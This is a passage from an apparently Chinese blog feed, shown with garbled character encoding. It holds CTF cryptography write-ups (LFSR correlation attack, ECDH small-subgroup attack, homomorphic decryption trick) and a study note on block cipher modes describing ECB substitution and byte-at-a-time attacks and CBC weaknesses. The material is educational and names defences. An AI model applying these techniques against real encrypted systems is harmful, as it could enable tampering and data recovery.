class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å­ï¼Œaoã€eo å’Œè¾“å‡ºæœ‰75%ç›¸åŒï¼Œè¿™é‡Œå¯ä»¥ç”¨ç›¸å…³æ”»å‡»ã€‚boçš„è¯ï¼Œçˆ†ç ´å°±å¥½äº†ã€‚</p><p>è¿™é‡Œè¯´è¯´è‡ªå·±å¯¹ç›¸å…³æ”»å‡»çš„ç†è§£ã€‚çº¿æ€§åé¦ˆä½ç§»å¯„å­˜å™¨æ˜¯ç”¨æ¥ç”Ÿæˆå¯†é’¥æµçš„å˜›ï¼Œç„¶åè‰¯å¥½ç”Ÿæˆæ–¹å¼åº”è¯¥æ˜¯è¾“å‡ºçš„æ¯ä¸€ä½ä¸º0å’Œ1çš„æ¦‚ç‡éƒ½åº”è¯¥æ˜¯0.5ï¼Œ<del>è¿™é‡Œçš„lfsråº”è¯¥ä¹Ÿæ˜¯æ¯”è¾ƒè‰¯å¥½çš„å§ï¼Œä¿ºçŒœçš„ï¼Œæœ‰ç°é¢˜äº†ï¼Œå°±æ‡’ç‹—äº†ï¼Œæ²¡æœ‰åšæµ‹è¯•ï¼Œ</del> æ‰€ä»¥æˆ‘ä»¬æ‰æœ‰ä¸Šé¢çš„è¡¨ã€‚</p><p>ç„¶åæˆ‘ä»¬å…ˆçˆ†ç ´aï¼Œå½“aoå’Œè¾“å‡ºï¼ˆä¸ç”¨å…¨éƒ¨è¾“å‡ºå•¦ï¼Œé¢˜ç›®ç»™çš„é‡æœ‰ç‚¹å¤§ï¼Œéšä¾¿æ¥ä¸ª1000ä½å¤§æ¦‚å°±å¥½äº†ï¼‰çš„75%ç›¸åŒæ—¶ï¼Œå¤§æ¦‚å°±ç¡®å®šaäº†ã€‚</p><p>ç„¶åæˆ‘ä»¬åŒæ—¶çˆ†ç ´c,dã€‚å½“co^do å’Œè¾“å‡ºçš„%75ç›¸åŒæ—¶ï¼Œå¤§æ¦‚å°±ç¡®å®šc,däº†ã€‚ï¼ˆå‡ºé¢˜äººæœ‰è‰¯å¿ƒï¼Œc å’Œ d ç»™çš„éƒ½æ¯”è¾ƒçŸ­ï¼‰</p><p>æœ€åæˆ‘ä»¬çˆ†ç ´bï¼ŒæŠŠä¹‹å‰å¾—åˆ°çš„a,c,då¸¦å…¥åˆ°åŠ å¯†ç¨‹åºï¼Œå¦‚æœè¾“å‡ºå’Œé¢˜ç›®ç»™çš„è¾“å‡ºå®Œå…¨ç›¸åŒå°±å¯äº†ã€‚ï¼ˆè¿™æ¬¡ä¹Ÿä¸ç”¨æµ‹å…¨éƒ¨ï¼Œæ¥ä¸ª50ä½ï¼Œ100ä½ä¹Ÿå°±è¶³å¤Ÿäº†ã€‚ï¼‰</p><h3 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h3><p>æ˜¯<a href="https://gist.github.com/LurkNoi/dfe86ed4d16776242251318b380336e7" target="_blank" rel="noopener">2019å¹´D3CTF common</a>ä¸€é¢˜çš„ä¸€ä¸ªpart</p><p>ç›´æ¥ç”¨å½“æ—¶å‡ºé¢˜äººç»™çš„é¢˜è§£expï¼Œ æ¢ä¸€æ¢alphaçš„å€¼ï¼Œç”¨è§£å‡ºæ¥çš„phiæ±‚è§£ç§é’¥ï¼Œè§£å¯†å¯†æ–‡ï¼Œè§‚å¯Ÿè§£å¯†åçš„æ˜æ–‡æ˜¯å¦ä¸ºflagå°±å¥½</p><p><del>é¢˜åšå‡ºæ¥äº†ï¼Œä½†å…¶å®åŸç†å¹¶æ²¡æœ‰æ‡‚ï¼Œæ˜¯ä¸€ä¸ªå¤§å‘ï¼Œç­‰ä¿ºå“ªå¤©å­¦ä¼šäº†å†è¯´å“ˆå“ˆå“ˆå“ˆå“ˆ</del></p><h3 id="ECDH"><a href="#ECDH" class="headerlink" title="ECDH"></a>ECDH</h3><p>NCCIPé—®é¢˜ï¼Œç›´æ¥æ„é€ å‡ºä½é˜¶ç‚¹Pï¼ˆè®°å½•Pçš„é˜¶ä¸ºNï¼‰ï¼Œç„¶åå‘é€ç»™æœåŠ¡ç«¯ï¼Œè®©ä»–ç®—å‡ºkeyï¼Œä¹‹ååŠ å¯†è‡ªå·±çš„è¾“å…¥ï¼Œæˆ‘ä»¬æ‹¿æ¥å¼‚æˆ–è‡ªå·±çš„è¾“å…¥ä»è€Œå¾—åˆ°keyï¼Œç„¶åæ ¹æ®keyçš„å€¼ï¼ˆå’ŒPçš„å…³ç³»ï¼‰å¯ä»¥å¾—åˆ°secretæ¨¡Nçš„ä¸€ä¸ªå‰©ä½™ï¼Œå³secret%Nï¼Œå¤šå‘é€å‡ ä¸ªï¼Œæœ€åæ¥ä¸€æ³¢CRTå°±å¥½ã€‚</p><p>å…·ä½“æ­¥éª¤ã€ç»†èŠ‚ä¿ºä¼šä¸“é—¨å†å†™ä¸€ç¯‡ã€‚  <del>åœ¨åšäº†ï¼Œåœ¨åšäº†</del></p><h3 id="Homomorphic"><a href="#Homomorphic" class="headerlink" title="Homomorphic"></a>Homomorphic</h3><p><del>è¿™é“é¢˜ä¿ºå…¶å®è¿è§£å¯†åŸç†éƒ½æ²¡ææ‡‚ï¼Œè‡ªå·±å¯¹å¤šé¡¹å¼è¿˜æ˜¯ä¸å¤Ÿäº†è§£ç†Ÿæ‚‰ï¼Œæ‰€ä»¥è¿™é¢˜å°±æœ¬åœ°æ­å¥½ï¼Œç„¶åæµ‹ï¼å°±ç¡¬æµ‹ï¼</del></p><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¯¥ç®—æ³•å¦‚å…¶åï¼Œå…·æœ‰åŠ æ³•åŒæ€ã€‚å¹¶ä¸”å‘é€(1,1,1,1,,,,,,1)å’Œ(1,1,1,,,,,1)è¿‡å»è§£å¯†å¾—åˆ°çš„æ˜æ–‡çš„asciiå€¼æ˜¯0ã€‚</p><p>æ‰€ä»¥ç›´æ¥æŠŠæœåŠ¡ç«¯ç»™çš„flagçš„æ‰€æœ‰å¯†æ–‡(FLAG)ï¼ˆ44å¯¹ï¼Œ88ç»„å¤šé¡¹å¼ï¼‰ï¼Œæ¯ä¸€å¯¹ä¸­æ¯ä¸€ç»„çš„æ¯ä¸€ä¸ªç³»æ•°éƒ½å‡1ï¼Œå‘é€å›å»ç»™æœåŠ¡ç«¯è§£å¯†å°±å¥½ã€‚ç„¶åindexè¾“å…¥0ï¼ˆå¤šé¡¹å¼çš„è¡¨è¾¾ï¼Œåˆ—è¡¨é‡Œå¤´å¥½åƒç¬¬ä¸€ä¸ªæ˜¯å¸¸æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦çš„mï¼‰ï¼Œå¾—åˆ°ä¸€ä½flagçš„asciiç ï¼Œ44æ¬¡äº¤äº’å¾—åˆ°flagã€‚</p><p><del>æ²¡æ‡‚åŸç†ï¼Œæµ‹è¯•å‡ºæ¥çš„è€Œå·²å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ</del></p><p>æ„Ÿè§‰è¿™æ˜¯éé¢„æœŸï¼Œæ¯•ç«Ÿè®©æˆ‘ä»¬äº¤äº’2^10æ¬¡ï¼Œå‡ºé¢˜äººåº”è¯¥æ˜¯çœ‹äº†è¿™ç¯‡<a href="https://arxiv.org/pdf/1906.07127.pdf" target="_blank" rel="noopener">paper</a>ï¼Œæƒ³è®©æˆ‘ä»¬æ¢å¤ç§é’¥çš„å§å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆã€‚<del>ä¿ºä»¥åæœ‰ç©ºä¸€å®šçœ‹ï¼Œä¸€å®šçœ‹</del>    ã€</p><p>PSï¼šbadmonkeyå¸ˆå‚…å¥½åƒæ˜¯æ ¹æ®è¿™ä¸ªæ¥çš„ï¼Œæ¢å¤äº†ç§é’¥ï¼ŒTQL!!!</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ åˆ†ç»„å¯†ç æ“ä½œæ¨¡å¼</title>
      <link href="/2020/03/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
      <url>/2020/03/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://mp.weixin.qq.com/s/DlKBJEc8mjTBS9QePaUE0w" target="_blank" rel="noopener">åˆå¤©æ™ºæ±‡</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>&emsp;&emsp;æœ€è¿‘åœ¨åˆ†ç»„å¯†ç å­¦ä¹ çš„è¿‡ç¨‹ä¸­ï¼Œäº†è§£äº†AESåˆ†ç»„å¯†ç ä»¥åŠåˆ†ç»„å¯†ç çš„äº”ç§æ“ä½œæ¨¡å¼ã€‚ç›®å‰å·²çŸ¥çš„å¯¹AESçš„åˆ†ææ”»å‡»éƒ½æ¯”è›®åŠ›æ”»å‡»çš„å¤æ‚åº¦è¦é«˜ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è·³è¿‡AESåŠ å¯†æœ¬èº«ï¼Œçœ‹çœ‹è¿™äº”ç§æ“ä½œæ¨¡å¼çš„åŸç†ä»¥åŠæ˜¯å¦ä¼šå› ä¸ºä¸€äº›æ“ä½œä¸å½“è€Œäº§ç”Ÿå¼±ç‚¹ã€‚</p><h3 id="æ“ä½œæ¨¡å¼"><a href="#æ“ä½œæ¨¡å¼" class="headerlink" title="æ“ä½œæ¨¡å¼"></a>æ“ä½œæ¨¡å¼</h3><p>&emsp;&emsp;åˆ†ç»„å¯†ç ä¸ä»…ä»…æ˜¯ä¸€ä¸ªåŠ å¯†ç®—æ³•ï¼Œä¹Ÿæ˜¯ç”¨äºå®ç°å¤šç§ä¸åŒå¯†ç å­¦ç¼–ç æœºåˆ¶çš„ä¸‡èƒ½å…ƒä»¶ã€‚ä¾‹å¦‚ï¼Œäººä»¬å¯ä»¥ä½¿ç”¨åˆ†ç»„å¯†ç æ„å»ºå„ç§ä¸åŒç§ç±»çš„åŸºäºåˆ†ç»„çš„åŠ å¯†æ–¹æ¡ˆï¼Œç”šè‡³è¿˜å¯ä»¥ç”¨å®ƒæ¥å®ç°åºåˆ—å¯†ç ã€‚å…¶ä¸­ï¼Œä¸åŒçš„åŠ å¯†æ–¹å¼å°±ç§°ä¸ºæ“ä½œæ¨¡å¼ã€‚ç›®å‰åŒ…æ‹¬äº”ç§ä¸»æµçš„æ“ä½œæ¨¡å¼ï¼š</p><p>ç”µå­å¯†ç æœ¬æ¨¡å¼(electronic code book mode, ECB)<br>å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼(cipher block chaining mode, CBC)<br>å¯†ç åé¦ˆæ¨¡å¼(cipher feedback mode, CFB)<br>è¾“å‡ºåé¦ˆæ¨¡å¼(output feedback mode, OFB)<br>è®¡æ•°å™¨æ¨¡å¼(Counter mode, CTR)</p><h4 id="ç”µå­å¯†ç æœ¬æ¨¡å¼ï¼ˆEBCï¼‰"><a href="#ç”µå­å¯†ç æœ¬æ¨¡å¼ï¼ˆEBCï¼‰" class="headerlink" title="ç”µå­å¯†ç æœ¬æ¨¡å¼ï¼ˆEBCï¼‰"></a>ç”µå­å¯†ç æœ¬æ¨¡å¼ï¼ˆEBCï¼‰</h4><p>&emsp;&emsp;ç”µå­å¯†ç æœ¬æ¨¡å¼æ˜¯ä¸€ç§æœ€ç›´æ¥çš„æ¶ˆæ¯åŠ å¯†æ–¹å¼ï¼Œ</p><p><strong>å‡è®¾$e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†ï¼›$e_k^{-1}()$å¯¹åº”è§£å¯†ã€‚</strong></p><p><strong>$x_i$ï¼Œ$y_i$è¡¨ç¤ºé•¿åº¦ä¸ºbçš„ä½å­—ç¬¦ä¸²ï¼Œï¼ˆé•¿åº¦ä¸å¤Ÿçš„å­—ç¬¦ä¸²ä¼šæŒ‰ç…§æŒ‡å®šçš„å¡«å……è§„åˆ™è¿›è¡Œå¡«å……ï¼‰</strong></p><p><strong>åŠ å¯†ï¼š$y_i=e_k(x_i)    ,iâ‰¥1 $  $(e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†)</strong></p><p><strong>è§£å¯†ï¼š$x_i=e_k^{-1}(y_i)    ,iâ‰¥1  (e_k^{-1}()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†çš„è§£å¯†)</strong></p><p>&emsp;&emsp;ç”µå­å¯†ç æœ¬æ¨¡å¼å°±æ˜¯æœ€ç®€å•çš„ä¸€ä¸€æ˜ å°„åŠ å¯†ï¼Œè¿™æ„å‘³ç€æ¯ä¸€ç»„çš„åŠ å¯†éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œæ‰€ä»¥EBCæ¨¡å¼åŠ å¯†å¯ä»¥å®ç°å¹¶è¡ŒåŒ–ï¼Œè¿™ç§æ–¹å¼åœ¨é«˜é€Ÿå®ç°ä¸­å…·æœ‰å¾ˆå¼ºçš„ä¼˜åŠ¿ã€‚å¹¶ä¸”ï¼Œå¦‚æœç”±äºä¼ è¾“é—®é¢˜å¯¼è‡´æ¶ˆæ¯ä¸­é—´æœ‰ä¸€æ®µæ•°æ®å—å½±å“ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°åé¢çš„æ¶ˆæ¯ï¼Œè¿™ä¸åé¢è¦æåˆ°çš„CBC,CFBç­‰æ¨¡å¼æ˜¯ä¸åŒçš„ã€‚</p><h5 id="ç¼ºé™·"><a href="#ç¼ºé™·" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h5><p>&emsp;&emsp;æ­£å› ä¸ºEBCæ¨¡å¼çš„ä¸€ä¸€æ˜ å°„åŠ å¯†ï¼Œæ¯ä¸€ç»„åŠ å¯†ç›¸äº’ç‹¬ç«‹ï¼Œæ‰€ä»¥åŒæ ·çš„æ˜æ–‡ç”¨åŒæ ·çš„å¯†é’¥å°±ä¼šåŠ å¯†å¾—åˆ°åŒæ ·çš„å¯†æ–‡ã€‚ä¸‹é¢ä»‹ç»EBCæ¨¡å¼ä¸‹çš„ä¸€ç§ç®€å•æ”»å‡»æ–¹å¼ï¼š</p><h5 id="ä»£æ¢æ”»å‡»"><a href="#ä»£æ¢æ”»å‡»" class="headerlink" title="ä»£æ¢æ”»å‡»"></a>ä»£æ¢æ”»å‡»</h5><p>å‡è®¾æŸä¸ªåè®®æ”¯æŒé“¶è¡Œé—´çš„ç”µæ±‡ï¼Œç”µæ±‡åŒ…å«äº”ä¸ªå­—æ®µï¼Œåˆ†åˆ«æœ‰äº”ä¸ªåˆ†ç»„</p><p><img src="https://i.loli.net/2020/04/30/ihsBnRE2rceHOyV.png" alt="ä»£æ¢æ”»å‡»"></p><p>é¦–å…ˆä¸€ä¸ªå‰ææ˜¯æˆ‘ä»¬èƒ½ç›‘å¬ï¼Œæ‹¦æˆªå¹¶æ›´æ”¹è¿™ä¸ªç”µæ±‡çš„å¯†æ–‡ï¼Œ</p><p>ç„¶åæˆ‘ä»¬å¯ä»¥å…ˆå¼€ä¸ªè´¦æˆ·ï¼Œè¿›è¡Œè‹¥å¹²æ¬¡è¯•éªŒï¼Œæ¯ä¸€æ¬¡å˜æ›´ä¸€ä¸ªå‚æ•°ï¼Œæ¯”å¦‚å‘é€è´¦å·ï¼Œè½¬è´¦é‡‘é¢ï¼Œä¸€ç»„å¯†ç çš„ä½æ•°ç­‰ï¼Œä»¥æ­¤æ¥ç¡®å®šæ¯ä¸€ä¸ªåˆ†ç»„çš„æ„ä¹‰ã€‚</p><p>ç­‰æˆ‘ä»¬å¤§æ¦‚çŸ¥é“äº”ä¸ªåˆ†ç»„çš„æ„ä¹‰åï¼Œæˆ‘ä»¬å°±èƒ½è¿›è¡Œæ›¿æ¢æ”»å‡»ã€‚æ¯”å¦‚é“¶è¡ŒAçš„æŸä¸ªè´¦æˆ·å‘é“¶è¡ŒBçš„æŸä¸ªè´¦æˆ·è½¬è´¦ï¼Œæˆ‘æˆ‘ä»¬å°†å…¶æ‹¦æˆªï¼ŒæŠŠæ¥å—è´¦å·å¯†æ–‡ä»£æ¢æˆäº‹å…ˆå­˜å¥½çš„æˆ‘ä»¬è´¦å·çš„å¯†æ–‡ï¼Œåˆ™é“¶è¡Œç”¨keyè§£å¯†åï¼Œå°±ä¼šæŠŠé’±éƒ½è½¬åˆ°æˆ‘ä»¬çš„è´¦æˆ·ä¸‹ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ•´ä¸ªè¿‡ç¨‹æˆ‘ä»¬å¹¶æ²¡æœ‰æ”»å‡»åˆ†ç»„å¯†ç æœ¬èº«ï¼Œæ‰€ä»¥å°½ç®¡åŠ å¯†æ–¹æ¡ˆæœ¬èº«å†å®‰å…¨ä¹ŸæŠµå¾¡ä¸äº†è¿™ç§æ”»å‡»ï¼›æˆ‘ä»¬ç”šè‡³ä¹Ÿä¸çŸ¥é“çœŸæ­£æ˜æ–‡çš„å†…å®¹ï¼Œæ‰€ä»¥å®ç°ä»£æ¢æ”»å‡»æ˜¯ç ´åäº†æ¶ˆæ¯çš„å®Œæ•´æ€§ã€‚</p><p>ä¾‹å­å¾ˆç‰¹æ®Šï¼Œæ¯”å¦‚äº”ä¸ªå‚æ•°åˆšå¥½åœ¨äº”ä¸ªåˆ†ç»„ç­‰ï¼Œåªæ˜¯ä¸ºäº†æ–¹ä¾¿ç†è§£_</p><h5 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h5><p>ç°å®ä¸­æŠµå¾¡ä»£æ¢æ”»å‡»å¸¸ç”¨æ¶ˆæ¯éªŒè¯ç (Message Authentication Code, MAC)ï¼Œå’Œæ•°å­—ç­¾åï¼Œä¸»è¦å°±æ˜¯ä¸ºäº†ç¡®ä¿æ¶ˆæ¯çš„å®Œæ•´æ€§ã€‚</p><h5 id="CTFä¸­EBCç›¸å…³çš„é¢˜ç›®-2019OGeek-Babycry"><a href="#CTFä¸­EBCç›¸å…³çš„é¢˜ç›®-2019OGeek-Babycry" class="headerlink" title="CTFä¸­EBCç›¸å…³çš„é¢˜ç›®-2019OGeek-Babycry"></a>CTFä¸­EBCç›¸å…³çš„é¢˜ç›®-2019OGeek-Babycry</h5><p>å‰é¢æåˆ°ï¼Œåˆ†ç»„åŠ å¯†ä¸­é•¿åº¦ä¸å¤Ÿçš„å­—ç¬¦ä¸²ä¼šæŒ‰ç…§æŒ‡å®šçš„å¡«å……è§„åˆ™è¿›è¡Œå¡«å……ï¼Œå†åŠ ä¸ŠECBè¿™æ ·ä¸€ä¸€æ˜ å°„çš„æ˜æ–‡-å¯†æ–‡å¯¹å…³ç³»ï¼Œå°±ä¼šäº§ç”Ÿåˆ©ç”¨padæ¥é€ä½çˆ†ç ´æ˜æ–‡çš„æ”»å‡»ã€‚</p><p>nc è¿‡å»å¾—åˆ°åŠ å¯†è§„åˆ™</p><p><img src="https://i.loli.net/2020/04/30/BlV5UeHiKtNGvzA.png" alt="Babycry"></p><p>åŠ å¯†è§„åˆ™æ˜¯desï¼ˆkey,sth..flag{*}paddingï¼‰&emsp;&emsp;    ï¼ˆæ¨¡å¼å¯ä»¥ç±»æ¯”ä¸ºECBçš„ä¸€ä¸€æ˜ å°„ï¼‰</p><p>åŠ ä¸Šhint</p><p>æ‰€ä»¥æˆ‘ä»¬æ§åˆ¶è¾“å…¥ï¼Œå¯ä»¥ä½¿å¾—è¢«åŠ å¯†çš„å­—ç¬¦æœ«å°¾ä¸º</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______ï¼ˆ<span class="number">7</span>ä¸ª<span class="keyword">_</span>ï¼‰</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚keyåŠ ä¸Šflagæ˜¯50ä½ï¼Œå¹¶ä¸”flagä»¥â€˜}â€™ ç»“å°¾ã€‚ä»–æ˜¯8ä½ä¸€ç»„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¡«ä¸Š7ä¸ªaï¼Œè¿™æ ·key+sth+flagå°±æœ‰57ä½ï¼Œå…«ä½ä¸€ç»„ï¼Œå‰é¢56ä½å­—ç¬¦åˆ†8ç»„ï¼Œäºæ˜¯æœ€åä¸€ç»„åŠ ä¸Šå¡«å……å°±æ˜¯<code>}_______ï¼ˆ7ä¸ª&#39;_&#39;ï¼‰</code></p><p>ç„¶åæœåŠ¡å™¨ä¼šè¿”å›ç»™æˆ‘ä»¬å¯†æ–‡ï¼Œäºæ˜¯å¯†æ–‡çš„æœ€åä¸€ç»„å°±ä»£è¡¨ç€<code>}_______ï¼ˆ7ä¸ª&#39;_&#39;ï¼‰</code>çš„å¯†æ–‡ï¼Œ</p><p>å¦‚æœæˆ‘ä»¬å†å¤šå¡«ä¸€ä¸ªaï¼Œé‚£ä¹ˆè¿”å›å¯†æ–‡ä¸­æœ€åä¸€ç»„å°±æ˜¯<code>?}______ï¼ˆ6ä¸ª&#39;_&#39;ï¼‰</code>çš„å¯†æ–‡â‘ ï¼ˆâ€™?â€™ä»£è¡¨flagçš„æœ€ååˆ°æ•°ç¬¬äºŒä½å­—ç¬¦ï¼ŒæœªçŸ¥ï¼Œéœ€è¦çˆ†ç ´ï¼‰</p><p>äºæ˜¯æˆ‘ä»¬å°±å¼€å§‹çˆ†ç ´ï¼Œæˆ‘ä»¬å…ˆæµ‹å‡ºkeyçš„é•¿åº¦å…ˆï¼Œï¼ˆçœ‹å¡«å‡ ä¸ªaä¼šå¯†æ–‡ä¼šå¤šå‡ºä¸€ç»„æ¥å°±èƒ½çŸ¥é“ï¼‰</p><p>ç„¶åå¡«aï¼Œè®©   len(key)+len(a)%8 == 0ï¼Œæ¥ç€ï¼Œæˆ‘ä»¬å°±å‘é€<code>aaa*}______ï¼ˆ6ä¸ª&#39;_&#39;ï¼‰</code>,ï¼ˆaçš„ä¸ªæ•°ç”±keyçš„é•¿åº¦å†³å®šï¼Œ*ä»£è¡¨ä»»æ„å­—ç¬¦ï¼Œæˆ‘ä»¬ç›´æ¥éå†å¯è§å­—ç¬¦è¡¨ï¼‰è®©æœåŠ¡è¿”å›åŠ å¯†ç»“æœï¼Œæˆ‘ä»¬æ‰¾åˆ°æ˜æ–‡å¯¹åº”çš„é‚£ä¸€ç»„å¯†æ–‡ï¼Œå’Œä¹‹å‰è¿”å›çš„å¯†æ–‡â‘ åšæ¯”è¾ƒï¼Œç»“æœä¸€æ ·ï¼Œè¯´æ˜é‚£ä½å­—ç¬¦æ­£ç¡®ï¼Œå¼€å§‹çˆ†ç ´ä¸‹ä¸€ä½å­—ç¬¦ã€‚</p><p>ä»¥æ­¤ç±»æ¨å¯ä»¥é€ä½çˆ†ç ´å‡ºæ‰€æœ‰ä½å­—ç¬¦ã€‚ï¼ˆåªæ˜¯çˆ†ç ´è¶…è¿‡å…«ä½åï¼Œç”¨æ¥ä½œä¸ºåˆ¤æ–­ä¾æ®çš„å¯†æ–‡â‘ å°±ä¸èƒ½å†ä»å¯†æ–‡æœ€åä¸€ç»„æ‰¾äº†ï¼Œå¾—ä»åˆ°æ•°ç¬¬äºŒç»„ï¼Œç¬¬ä¸‰ç»„â€¦.æ‰¾_ï¼‰</p><h4 id="å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼-CBC"><a href="#å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼-CBC" class="headerlink" title="å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼(CBC)"></a>å¯†ç åˆ†ç»„é“¾æ¥æ¨¡å¼(CBC)</h4><p>åœ¨CBCæ¨¡å¼ä¸­ï¼Œåä¸€ç»„çš„å¯†æ–‡éƒ½å—å‰ä¸€ç»„å¯†æ–‡å½±å“ï¼Œç¬¬ä¸€ç»„å¯†æ–‡å—åˆå§‹å‘é‡IVå½±å“ï¼Œä»è€Œæ˜æ–‡çš„é‡å¤æ’åˆ—ä¸ä¼šååº”åœ¨å¯†æ–‡ä¸­ã€‚</p><p><strong>å‡è®¾$e_k()$è¡¨ç¤ºç”¨å¯†é’¥kè¿›è¡Œçš„åˆ†ç»„åŠ å¯†ï¼›$e_k^{-1}()$å¯¹åº”è§£å¯†ã€‚</strong></p><p><strong>$x_iï¼Œy_i$è¡¨ç¤ºé•¿åº¦ä¸ºbçš„ä½å­—ç¬¦ä¸²ï¼ŒIVè¡¨ç¤ºé•¿åº¦ä¸ºbçš„åˆå§‹å‘é‡ï¼Œï¼ˆé•¿åº¦ä¸å¤Ÿçš„å­—ç¬¦ä¸²ä¼šæŒ‰ç…§æŒ‡å®šçš„å¡«å……è§„åˆ™è¿›è¡Œå¡«å……ï¼‰</strong></p><p><em>*åŠ å¯†ï¼š</em>$y_1=e_k(x_1 âŠ• IV)$     **</p><p>&emsp;&emsp;    $y_i=e_k(x_iâŠ• y_{i-1})    ,iâ‰¥2 $</p><p><em>*è§£å¯†ï¼š</em>$x_1=e_k^{-1}(y_1)âŠ• IV$ **</p><p>&emsp;&emsp;    $x_i=e_k^{-1}(y_i) âŠ• y_{i-1}    ,iâ‰¥2$ </p><p>&emsp;&emsp;å¦‚æœæ¯æ¬¡åŠ å¯†æ˜¯éƒ½é€‰æ‹©ä¸€ä¸ªæ–°çš„IVï¼Œåˆ™CBCæ¨¡å¼å°±å˜æˆäº†ä¸€ä¸ªæ¦‚ç‡åŠ å¯†æ–¹æ¡ˆï¼Œå³ç›¸åŒçš„æ˜æ–‡åŠ å¯†ä¼šç”Ÿæˆä¸åŒçš„å¯†æ–‡ã€‚</p><p>&emsp;&emsp;éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œå¦‚æœæ¯æ¬¡é€‰æ‹©IVçš„æ•°å€¼å¾—å½“ï¼Œåˆ™ä»£æ¢æ”»å‡»ä¼šå½»åº•å¤±æ•ˆï¼Œå› ä¸ºç›‘å¬è€…æ— æ³•è¯†åˆ«åŠ å¯†çš„æ¨¡å¼ã€‚ä½†æ˜¯å¦‚æœè‹¥å¹²æ¬¡åŠ å¯†ä½¿ç”¨ç›¸åŒçš„IVï¼Œåˆ™ç›‘å¬è€…è¿˜æ˜¯å¯ä»¥è¯†åˆ«åŠ å¯†æ¨¡å¼ã€‚</p><p>&emsp;&emsp;è™½ç„¶ï¼ˆæ‰¿æ¥ECBçš„ä¾‹å­ï¼‰è¿™ä¸€æ¬¡ç›´æ¥å°†æˆ‘ä»¬çš„è´¦æˆ·çš„å¯†æ–‡æ›¿æ¢ä¸Šå»å·²ç»ä¸èƒ½å®ç°å‘æˆ‘ä»¬è´¦æˆ·è½¬è´¦çš„æ•ˆæœï¼Œå› ä¸ºæˆ‘ä»¬ä»£æ¢ï¼Œä¼šå¯¼è‡´ç¬¬å››ã€äº”ç»„æ¶ˆæ¯éƒ½è¢«ç ´åï¼Œä½†æ˜¯æœ‰å¯èƒ½è§£å¯†åï¼Œè´¦æˆ·å’Œé‡‘é¢ä»ç„¶å…·æœ‰æ„ä¹‰å‘¢ï¼Ÿï¼ˆè™½ç„¶å¯èƒ½æ€§ä¼¼ä¹å¾ˆä½ï¼‰åªæ˜¯æ˜¯éšæœºçš„ï¼Œä¸å†å¯æ§äº†è€Œå·²ã€‚ä½†è¿™ä»ç„¶æ˜¯é“¶è¡Œæ‰€ä¸å¯æ¥å—çš„ã€‚æ‰€ä»¥æ¶ˆæ¯éªŒè¯ç å’Œæ•°å­—ç­¾åçš„ä½œç”¨æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚</p><h5 id="ç¼ºé™·-1"><a href="#ç¼ºé™·-1" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h5><p>å› ä¸ºæŸäº›åŸå› ï¼Œä½¿å¾—æŸä¸€ç»„å¯†æ–‡ä¸­å‡ºç°äº†é”™è¯¯çš„bitï¼Œå°†å½±å“è¿™ä¸€ç»„(æ•´ç»„)åŠå…¶ä¹‹åä¸€ç»„(ç›¸åº”ä½)åˆ†ç»„çš„è§£å¯†ã€‚ç”±æ­¤äº§ç”Ÿäº†CBCåè½¬å­—èŠ‚æ”»å‡»ã€‚å¦å¤–ä¸ä¸‹é¢æ‰€è®²çš„CFBæ¨¡å¼ä¸€æ ·ï¼ŒCBCæ¨¡å¼ä¹Ÿä¸èƒ½æŠµå¾¡é‡æ”¾æ”»å‡»ã€‚</p><h5 